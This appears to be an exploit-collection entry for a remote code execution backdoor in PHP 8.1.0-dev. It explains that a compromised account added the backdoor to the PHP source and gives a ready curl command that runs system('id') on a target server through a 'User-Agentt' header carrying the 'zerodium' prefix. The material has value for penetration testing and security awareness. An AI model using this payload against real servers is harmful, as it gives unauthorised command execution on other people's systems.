# PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution

## Requirements

 - The server needs to run on a specific backdoored version of PHP (PHP-8.1.0-dev)

## Exploitation

A compromised git account pushed code to the PHP source repository adding a backdoor in commit [c730aa26bd52829a49f2ad284b181b7e82a68d7d](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d). 

You can execute PHP code (prefixed by the string `zerodium`) on the remote machine through the `User-Agentt` header:

```sh
curl 'http://TARGET/' --header "User-Agentt: zerodiumsystem('id');"
```

## References
 - https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
 - https://news-web.php.net/php.internals/113838
